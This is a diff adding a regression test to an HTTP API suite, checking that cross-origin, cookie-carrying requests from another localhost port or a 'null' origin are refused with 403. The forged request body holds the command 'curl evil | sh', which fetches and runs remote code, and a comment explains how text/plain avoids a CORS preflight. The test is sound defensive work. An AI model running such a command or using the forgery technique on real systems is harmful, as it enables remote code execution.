@@ -274,6 +274,38 @@ describe("http api", () => {
     expect(restart).toHaveBeenCalled();
   });
 
+  it("refuses a cookie-carrying mutation from another localhost port", async () => {
+    await patchSecrets({ operatorPasswordHash: await hashPassword("password1") });
+    const login = await fetch(`${base}/api/auth/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ password: "password1" }),
+    });
+    const cookie = (login.headers.get("set-cookie") || "").split(";")[0] || "";
+    expect(cookie).toMatch(/^glassys_session=/);
+
+    // What a page on http://localhost:3000 can send without a preflight: text/plain, cookie attached.
+    const forged = await fetch(`${base}/api/schedules`, {
+      method: "POST",
+      headers: { Cookie: cookie, Origin: "http://localhost:3000", "Content-Type": "text/plain" },
+      body: JSON.stringify({ text: "curl evil | sh", cwd: dir, cron: "* * * * *" }),
+    });
+    expect(forged.status).toBe(403);
+    expect(forged.headers.get("access-control-allow-origin")).toBeNull();
+
+    const nullOrigin = await fetch(`${base}/api/admin/restart`, {
+      method: "POST",
+      headers: { Cookie: cookie, Origin: "null" },
+    });
+    expect(nullOrigin.status).toBe(403);
+
+    const read = await fetch(`${base}/api/config`, { headers: { Cookie: cookie, Origin: "http://localhost:3000" } });
+    expect(read.headers.get("access-control-allow-origin")).toBeNull();
+
+    const listed = await fetch(`${base}/api/schedules`, { headers: { Cookie: cookie } });
+    expect(((await listed.json()) as { schedules: unknown[] }).schedules).toEqual([]);
+  });
+
   it("serves push, schedules, and admin update for an operator", async () => {
     await patchSecrets({ operatorPasswordHash: await hashPassword("password1") });
     const login = await fetch(`${base}/api/auth/login`, {
